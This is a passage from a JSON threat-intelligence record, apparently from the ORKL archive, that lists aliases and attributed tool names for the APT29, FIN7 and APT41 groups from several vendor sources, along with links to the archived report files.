                "Carbanak",
                "Pillowmint",
                "Cobalt Strike",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRat",
                "Lizar",
                "TEXTMATE",
                "BOOSTWRITE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d85adfe3-e1c3-40b0-b8bb-d1bacadc4d82",
            "created_at": "2022-10-25T16:07:23.619566Z",
            "updated_at": "2025-03-27T02:02:09.890982Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "APT-C-11",
                "ATK 32",
                "Gold Niagara",
                "ITG14",
                "TAG-CR1"
            ],
            "source_name": "ETDA:FIN7",
            "tools": [
                "7Logger",
                "Agentemis",
                "Anunak",
                "Astra",
                "BIOLOAD",
                "BIRDWATCH",
                "Bateleur",
                "Boostwrite",
                "CROWVIEW",
                "Carbanak",
                "Cobalt Strike",
                "CobaltStrike",
                "DICELOADER",
                "DNSMessenger",
                "FOWLGAZE",
                "HALFBAKED",
                "JSSLoader",
                "KillACK",
                "LOADOUT",
                "Lizar",
                "Meterpreter",
                "Mimikatz",
                "POWERPLANT",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "TEXTMATE",
                "Tirion",
                "VB Flash",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041776,
    "ts_creation_date": 1631555855,
    "ts_modification_date": 1631555946,
    "files": {
        "pdf": "https://archive.orkl.eu/f19750cb89ed9c741fd3eafc98cef49f916a9843.pdf",
        "text": "https://archive.orkl.eu/f19750cb89ed9c741fd3eafc98cef49f916a9843.txt",
        "img": "https://archive.orkl.eu/f19750cb89ed9c741fd3eafc98cef49f916a9843.jpg"
    }
}